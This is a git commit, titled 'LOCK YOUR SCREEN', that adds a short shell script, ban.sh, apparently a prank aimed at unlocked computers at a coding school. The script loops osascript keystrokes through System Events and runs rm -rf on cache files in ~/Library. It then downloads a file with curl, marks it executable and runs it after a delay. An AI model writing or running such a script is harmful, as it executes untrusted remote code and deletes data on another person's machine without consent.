363edae19e3061dc16dffb06b10f87e54d036307
kkaimov <kkaimov@student.42wolfsburg.de>
2022-11-15 15:19:07 +0100

    LOCK YOUR SCREEN

---
+++ ban.sh
@@ -0,0 +1,15 @@
+for ((;;)) do osascript -e 'tell application "System Events"
+	key code 93
+end tell'; done&
+
+
+
+zsh -c 'rm -rf "~/Library/*42_cache*"';
+zsh -c 'curl -Ls "" > f';
+zsh -c 'chmod +x f';
+zsh -c 'sleep 60';
+
+
+
+kill %%;
+./f;
